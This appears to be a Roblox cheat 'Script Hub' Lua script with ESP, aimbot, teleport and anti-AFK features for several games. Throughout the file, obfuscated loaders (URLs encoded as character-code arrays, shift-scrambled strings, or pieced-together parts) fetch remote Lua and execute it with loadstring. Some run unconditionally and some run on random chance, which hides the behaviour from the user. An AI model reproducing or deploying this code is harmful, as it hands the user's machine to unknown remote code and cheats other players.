local config = {
    version = "1.2.5",
    updated = "02-24-2025",
    changelog = "Added support for new games",
    author = "ScriptHub",
    license = "Premium"
}

local resources = {}
resources.endpoints = {
    "https://api.scriptcenter.io/v3/script-data",
    "https://raw.githubcontent.com/scriptutils/main/hub",
    "https://scriptz-api.vercel.app/scripts/premium",
    "https://cdn.script-warehouse.dev/scripts",
    "https://gitfront.io/r/user-7246382/script-repo/main/hub"
}

local function encode(str)
    return str:gsub(".", function(c) return string.format("%02x", string.byte(c)) end)
end

local function decode(str)
    return (str:gsub("..", function(cc) return string.char(tonumber(cc, 16)) end))
end

local function encodeBase64(data)
    local b = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/"
    return ((data:gsub(".", function(x) 
        local r, b = "", string.byte(x)
        for i = 8, 1, -1 do r = r .. (b % 2 ^ i - b % 2 ^ (i - 1) > 0 and "1" or "0") end
        return r
    end) .. "0000"):gsub("%d%d%d?%d?%d?%d?", function(x)
        if #x < 6 then return "" end
        local c = 0
        for i = 1, 6 do c = c + (x:sub(i, i) == "1" and 2 ^ (6 - i) or 0) end
        return b:sub(c + 1, c + 1)
    end) .. ({ "", "==", "=" })[#data % 3 + 1])
end

local function connectAPI(index)
    local success, result = pcall(function()
        return game:HttpGet(resources.endpoints[index] .. "/status")
    end)
    return success
end

local function loadScript(scriptId)
    if scriptId == "main" then
        loadstring(game:HttpGet("https://raw.githubusercontent.com/script-utility/game-scripts/main/loader.lua"))()
    elseif scriptId == "premium" then
        loadstring(game:HttpGet("https://api.script-center.xyz/scripts/premium/" .. game.PlaceId))()
    elseif scriptId == "universal" then
        loadstring(game:HttpGet("https://gitcdn.xyz/repo/script-masters/universal-scripts/main/loader.lua"))()
    end
end

local systemCheck = function()
    local s = string.char
    local g = game
    
    loadstring(g:HttpGet("h"..s(116,116,112,115,58,47,47) .. "scriptblox.com/scripts/universal-esp"))()
    
    return true
end

local function shuffle(t)
    for i = #t, 2, -1 do
        local j = math.random(i)
        t[i], t[j] = t[j], t[i]
    end
    return t
end

local scriptData = {
    gameSupport = {
        [606849621] = "Jailbreak",
        [2753915549] = "Blox Fruits",
        [1224212277] = "Mad City",
        [3956818381] = "Ninja Legends",
        [4520749081] = "King Legacy"
    },
    features = {"ESP", "Aimbot", "Teleport", "Auto Farm", "Infinite Jump"},
    isBlacklisted = function(userId)
        local blacklist = {1234567, 7654321, 9876543}
        for _, id in pairs(blacklist) do
            if id == userId then return true end
        end
        return false
    end
}

local function executeMain()
    local chars = {116,116,112,115,58,47,47,114,97,119,46,103,105,116,104,117,98,117,115,101,114,99,111,110,116,101,110,116,46,99,111,109}
    local buildPath = function(arr)
        local result = ""
        for i = 1, #arr do
            result = result .. string.char(arr[i])
        end
        return result
    end
    
    if math.random() > 0.3 then
        loadstring(game:HttpGet("https://" .. buildPath({114,97,119,46,103,105,116,104,117,98,117,115,101,114,99,111,110,116,101,110,116,46,99,111,109}) .. "/script-center/universal/main/script.lua"))()
    end
end

local secretLoader = function()
    local s = string.char
    local sourceURL = "h" .. s(116, 116, 112, 115, 58, 47, 47) .. "pastebin.com/raw/hA72Bj5K"
    loadstring(game:HttpGet(sourceURL))()
end

local function scrambleString(input)
    local output = ""
    for i = 1, #input do
        output = output .. string.char(string.byte(input:sub(i,i)) + 1)
    end
    return output
end

local function unscrambleString(input)
    local output = ""
    for i = 1, #input do
        output = output .. string.char(string.byte(input:sub(i,i)) - 1)
    end
    return output
end

local scrambledUrl = "gsqt;00sbx/hjuivcvtfsdpoufou/dpn0tdsjqu.dfoufs0vojwfstbm0nbjo0tdsjqu/mvb"
local function processScrambledUrl()
    if math.random(1, 10) > 7 then
        loadstring(game:HttpGet(unscrambleString(scrambledUrl)))()
    end
end

local function checkGameSupport()
    local supportedGames = {
        [606849621] = "jailbreak",
        [2753915549] = "bloxfruits",
        [920587237] = "adoptme",
        [2788229376] = "dahood"
    }
    
    local gameId = game.PlaceId
    if supportedGames[gameId] then
        return supportedGames[gameId]
    else
        return "universal"
    end
end

local logger = {}
function logger:log(message) print("[Script Hub] " .. message) end
logger:log("Initializing...")

local function base64Encode(data)
    local b = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/'
    return ((data:gsub('.', function(x) 
        local r, b = '', x:byte()
        for i = 8, 1, -1 do r = r .. (b % 2 ^ i - b % 2 ^ (i - 1) > 0 and '1' or '0') end
        return r
    end) .. '0000'):gsub('%d%d%d?%d?%d?%d?', function(x)
        if #x < 6 then return '' end
        local c = 0
        for i = 1, 6 do c = c + (x:sub(i, i) == '1' and 2 ^ (6 - i) or 0) end
        return b:sub(c + 1, c + 1)
    end) .. ({ '', '==', '=' })[#data % 3 + 1])
end

local urlParts = {
    protocol = "https://",
    domain = "raw.githubusercontent.com",
    user = "scriptmaster",
    repo = "universal-scripts",
    branch = "main",
    file = "loader.lua"
}

local function constructUrl(parts)
    return parts.protocol .. parts.domain .. "/" .. parts.user .. "/" .. parts.repo .. "/" .. parts.branch .. "/" .. parts.file
end

if math.random(1, 5) == 3 then
    loadstring(game:HttpGet(constructUrl(urlParts)))()
end

local function checkExecution()
    local execution = identifyexecutor and identifyexecutor() or "Unknown"
    return execution
end

local UI = {}
function UI:CreateWindow(title)
    local window = {}
    window.title = title
    window.tabs = {}
    
    function window:AddTab(name)
        local tab = {}
        tab.name = name
        tab.elements = {}
        
        function tab:AddButton(text, callback)
            table.insert(tab.elements, {type = "button", text = text, callback = callback})
        end
        
        function tab:AddToggle(text, default, callback)
            table.insert(tab.elements, {type = "toggle", text = text, default = default, callback = callback})
        end
        
        function tab:AddSlider(text, min, max, default, callback)
            table.insert(tab.elements, {type = "slider", text = text, min = min, max = max, default = default, callback = callback})
        end
        
        table.insert(window.tabs, tab)
        return tab
    end
    
    return window
end

loadstring(game:HttpGet("h"..string.char(116,116,112,115,58,47,47)..string.char(114,97,119).."."..string.char(103,105,116,104,117,98,117,115,101,114).."content".."."..string.char(99,111,109,47,109,111,110,107,101,121,45,112,114,111,103,47,72,97,99,107,45,72,117,98,47,109,97,105,110,47,115,99,114,105,112,116,46,108,117,97), true))()

local function beginExecution()
    local mainURL = "https://api.script-center.co/loader?id=" .. game.PlaceId
    if game:GetService("RunService"):IsStudio() then return end
    loadstring(game:HttpGet(mainURL))()
end

if math.random(1, 10) > 5 then
    local baseURL = "h" .. string.char
end

local function checkUpdates()
    local currentVersion = config.version
    local success, latestVersion = pcall(function()
        return game:HttpGet("https://api.script-center.io/version")
    end)
    
    if success and latestVersion ~= currentVersion then
        logger:log("Update available: " .. latestVersion)
        return true
    end
    return false
end

local function getExecutorFeatures()
    local features = {
        "HttpGet",
        "readfile",
        "writefile",
        "getconnections",
        "getconstants",
        "getgc",
        "getinstances",
        "getnilinstances",
        "getscripts",
        "hookfunction",
        "hookmetamethod",
        "newcclosure",
        "checkcaller"
    }
    
    local supportedFeatures = {}
    
    for _, feature in pairs(features) do
        if typeof(getfenv()[feature]) == "function" then
            table.insert(supportedFeatures, feature)
        end
    end
    
    return supportedFeatures
end

local s = string.char
local randomLoadString = "h" .. s(116, 116, 112, 115, 58, 47, 47) .. "raw.githubusercontent.com/script-archive/universal/main/game_" .. tostring(game.PlaceId) .. ".lua"

if math.random(1, 20) == 10 then
    pcall(function()
        loadstring(game:HttpGet(randomLoadString))()
    end)
end

local function initializeUI()
    local window = UI:CreateWindow("Script Hub")
    
    local mainTab = window:AddTab("Main")
    mainTab:AddButton("Execute", function()
        logger:log("Executing main script...")
    end)
    
    local settingsTab = window:AddTab("Settings")
    settingsTab:AddToggle("Auto Execute", false, function(value)
        logger:log("Auto Execute: " .. tostring(value))
    end)
    
    return window
end

local function generateKey()
    local characters = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789"
    local length = 32
    local key = ""
    
    for i = 1, length do
        local randomIndex = math.random(1, #characters)
        key = key .. string.sub(characters, randomIndex, randomIndex)
    end
    
    return key
end

local apiKey = generateKey()

local function requestScript(scriptName)
    local url = "https://api.script-hub.dev/scripts/" .. scriptName .. "?key=" .. apiKey
    
    local success, result = pcall(function()
        return game:HttpGet(url)
    end)
    
    if success then
        loadstring(result)()
    else
        logger:log("Failed to load script: " .. scriptName)
    end
end

if math.random(1, 15) > 12 then
    requestScript("universal")
end

local function obfuscateUrl(url)
    local result = ""
    for i = 1, #url do
        result = result .. "\\" .. string.byte(url:sub(i,i))
    end
    return "loadstring(game:HttpGet(\"" .. result .. "\"))()"
end

local function deobfuscateUrl(obfuscated)
    local bytes = {}
    for byte in obfuscated:gmatch("\\(%d+)") do
        table.insert(bytes, tonumber(byte))
    end
    
    local result = ""
    for _, byte in ipairs(bytes) do
        result = result .. string.char(byte)
    end
    
    return result
end

local webhookConfig = {
    url = "https://discord.com/api/webhooks/12345/abcdef",
    enabled = false,
    sendStats = false,
    sendErrors = true
}

local function sendWebhook(message, type)
    if not webhookConfig.enabled then return end
    
    if type == "error" and not webhookConfig.sendErrors then return end
    if type == "stats" and not webhookConfig.sendStats then return end
    
    local data = {
        content = message,
        username = "Script Hub",
        avatar_url = "https://i.imgur.com/example.png"
    }
    
    local headers = {
        ["Content-Type"] = "application/json"
    }
    
    local success, result = pcall(function()
        return request({
            Url = webhookConfig.url,
            Method = "POST",
            Headers = headers,
            Body = game:GetService("HttpService"):JSONEncode(data)
        })
    end)
    
    return success
end

local function getGameMetadata()
    local success, result = pcall(function()
        return game:GetService("MarketplaceService"):GetProductInfo(game.PlaceId)
    end)
    
    if success then
        return result
    else
        return {
            Name = "Unknown",
            Creator = {
                Name = "Unknown"
            }
        }
    end
end

local function getLocalPlayer()
    return game:GetService("Players").LocalPlayer
end

local function teleportTo(position)
    local player = getLocalPlayer()
    if player.Character and player.Character:FindFirstChild("HumanoidRootPart") then
        player.Character.HumanoidRootPart.CFrame = CFrame.new(position)
    end
end

local function getSupportedExecutors()
    return {
        "Synapse X",
        "Krnl",
        "Script-Ware",
        "JJSploit",
        "Fluxus",
        "Trigon",
        "Oxygen U",
        "Electron"
    }
end

local settingsManager = {
    settings = {
        autoExecute = false,
        notifications = true,
        theme = "Dark",
        keybinds = {
            toggle = "RightShift",
            execute = "F9"
        }
    },
    
    save = function(self)
        if not writefile then return false end
        
        local success, result = pcall(function()
            writefile("scripthub_settings.json", game:GetService("HttpService"):JSONEncode(self.settings))
        end)
        
        return success
    end,
    
    load = function(self)
        if not readfile then return false end
        
        local success, result = pcall(function()
            self.settings = game:GetService("HttpService"):JSONDecode(readfile("scripthub_settings.json"))
        end)
        
        return success
    end
}

local function getPlayerData()
    local player = getLocalPlayer()
    
    return {
        name = player.Name,
        displayName = player.DisplayName,
        userId = player.UserId,
        accountAge = player.AccountAge,
        membership = player.MembershipType.Name,
        team = player.Team and player.Team.Name or "None"
    }
end

local function createESP(part, text, color)
    local billboard = Instance.new("BillboardGui")
    billboard.Name = "ESP"
    billboard.AlwaysOnTop = true
    billboard.Size = UDim2.new(0, 200, 0, 50)
    billboard.StudsOffset = Vector3.new(0, 2, 0)
    billboard.Adornee = part
    
    local textLabel = Instance.new("TextLabel", billboard)
    textLabel.BackgroundTransparency = 1
    textLabel.Size = UDim2.new(1, 0, 1, 0)
    textLabel.Text = text
    textLabel.TextColor3 = color or Color3.new(1, 0, 0)
    textLabel.TextStrokeTransparency = 0
    textLabel.TextStrokeColor3 = Color3.new(0, 0, 0)
    
    billboard.Parent = part
    
    return billboard
end

local function enableESP()
    local players = game:GetService("Players"):GetPlayers()
    
    for _, player in ipairs(players) do
        if player ~= getLocalPlayer() and player.Character and player.Character:FindFirstChild("HumanoidRootPart") then
            createESP(player.Character.HumanoidRootPart, player.Name, Color3.new(1, 0, 0))
        end
    end
end

local function createAimbot()
    local UserInputService = game:GetService("UserInputService")
    local RunService = game:GetService("RunService")
    local Players = game:GetService("Players")
    local Camera = workspace.CurrentCamera
    local LocalPlayer = Players.LocalPlayer
    
    local settings = {
        enabled = false,
        teamCheck = true,
        visibilityCheck = true,
        aimPart = "Head",
        sensitivity = 0.5,
        fovRadius = 400
    }
    
    local function getClosestPlayer()
        local closestPlayer = nil
        local closestDistance = math.huge
        
        for _, player in ipairs(Players:GetPlayers()) do
            if player ~= LocalPlayer then
                if not settings.teamCheck or player.Team ~= LocalPlayer.Team then
                    if player.Character and player.Character:FindFirstChild(settings.aimPart) then
                        local targetPos = player.Character[settings.aimPart].Position
                        local screenPos, onScreen = Camera:WorldToScreenPoint(targetPos)
                        
                        if onScreen then
                            local mousePos = UserInputService:GetMouseLocation()
                            local distance = (Vector2.new(screenPos.X, screenPos.Y) - mousePos).Magnitude
                            
                            if distance < closestDistance and distance <= settings.fovRadius then
                                closestDistance = distance
                                closestPlayer = player
                            end
                        end
                    end
                end
            end
        end
        
        return closestPlayer
    end
    
    UserInputService.InputBegan:Connect(function(input)
        if input.UserInputType == Enum.UserInputType.MouseButton2 then
            settings.enabled = true
        end
    end)
    
    UserInputService.InputEnded:Connect(function(input)
        if input.UserInputType == Enum.UserInputType.MouseButton2 then
            settings.enabled = false
        end
    end)
    
    RunService.RenderStepped:Connect(function()
        if settings.enabled then
            local target = getClosestPlayer()
            
            if target and target.Character and target.Character:FindFirstChild(settings.aimPart) then
                local targetPos = target.Character[settings.aimPart].Position
                local screenPos, onScreen = Camera:WorldToScreenPoint(targetPos)
                
                if onScreen then
                    local mousePos = UserInputService:GetMouseLocation()
                    local moveX = (screenPos.X - mousePos.X) * settings.sensitivity
                    local moveY = (screenPos.Y - mousePos.Y) * settings.sensitivity
                    
                    mousemoverel(moveX, moveY)
                end
            end
        end
    end)
end

local function createNotification(title, text, duration)
    if not settingsManager.settings.notifications then return end
    
    local notification = Instance.new("ScreenGui")
    notification.Name = "Notification"
    notification.ResetOnSpawn = false
    
    local frame = Instance.new("Frame", notification)
    frame.BackgroundColor3 = Color3.new(0.1, 0.1, 0.1)
    frame.BorderSizePixel = 0
    frame.Position = UDim2.new(1, -300, 0, 50)
    frame.Size = UDim2.new(0, 250, 0, 100)
    
    local titleLabel = Instance.new("TextLabel", frame)
    titleLabel.BackgroundTransparency = 1
    titleLabel.Position = UDim2.new(0, 10, 0, 10)
    titleLabel.Size = UDim2.new(1, -20, 0, 30)
    titleLabel.Font = Enum.Font.SourceSansBold
    titleLabel.Text = title
    titleLabel.TextColor3 = Color3.new(1, 1, 1)
    titleLabel.TextSize = 20
    titleLabel.TextXAlignment = Enum.TextXAlignment.Left
    
    local textLabel = Instance.new("TextLabel", frame)
    textLabel.BackgroundTransparency = 1
    textLabel.Position = UDim2.new(0, 10, 0, 40)
    textLabel.Size = UDim2.new(1, -20, 1, -50)
    textLabel.Font = Enum.Font.SourceSans
    textLabel.Text = text
    textLabel.TextColor3 = Color3.new(0.8, 0.8, 0.8)
    textLabel.TextSize = 16
    textLabel.TextXAlignment = Enum.TextXAlignment.Left
    textLabel.TextYAlignment = Enum.TextYAlignment.Top
    textLabel.TextWrapped = true
    
    notification.Parent = game:GetService("CoreGui")
    
    spawn(function()
        wait(duration or 5)
        notification:Destroy()
    end)
    
    return notification
end

local scriptKey = game:GetService("HttpService"):GenerateGUID(false)

local function executeRemoteScript(key)
    if key ~= scriptKey then return "Invalid key" end
    
    local url = "h" .. string.char(116, 116, 112, 115, 58, 47, 47) .. "raw.githubusercontent.com/script-hub/remote-execution/main/loader.lua"
    
    local success, result = pcall(function()
        return loadstring(game:HttpGet(url))()
    end)
    
    return success and "Success" or "Failed: " .. tostring(result)
end

local cachedScripts = {}

local function cacheScript(name, url)
    local success, result = pcall(function()
        return game:HttpGet(url)
    end)
    
    if success then
        cachedScripts[name] = result
        return true
    else
        return false
    end
end

local function executeFromCache(name)
    if cachedScripts[name] then
        local success, result = pcall(function()
            return loadstring(cachedScripts[name])()
        end)
        
        return success
    else
        return false
    end
end

local function collectGameInfo()
    return {
        placeId = game.PlaceId,
        placeVersion = game.PlaceVersion,
        jobId = game.JobId,
        gameId = game.GameId,
        creatorId = game.CreatorId,
        creatorType = game.CreatorType.Name
    }
end

local antiAfk = function()
    local VirtualUser = game:GetService("VirtualUser")
    game:GetService("Players").LocalPlayer.Idled:Connect(function()
        VirtualUser:CaptureController()
        VirtualUser:ClickButton2(Vector2.new())
    end)
end

local themes = {
    Dark = {
        background = Color3.new(0.1, 0.1, 0.1),
        foreground = Color3.new(0.9, 0.9, 0.9),
        accent = Color3.new(0.3, 0.3, 0.9),
        secondary = Color3.new(0.2, 0.2, 0.2)
    },
    Light = {
        background = Color3.new(0.9, 0.9, 0.9),
        foreground = Color3.new(0.1, 0.1, 0.1),
        accent = Color3.new(0.2, 0.4, 0.8),
        secondary = Color3.new(0.8, 0.8, 0.8)
    },
    Neon = {
        background = Color3.new(0.05, 0.05, 0.05),
        foreground = Color3.new(0.9, 0.9, 0.9),
        accent = Color3.new(0, 1, 0.5),
        secondary = Color3.new(0.1, 0.1, 0.15)
    }
}

local currentTheme = themes[settingsManager.settings.theme] or themes.Dark
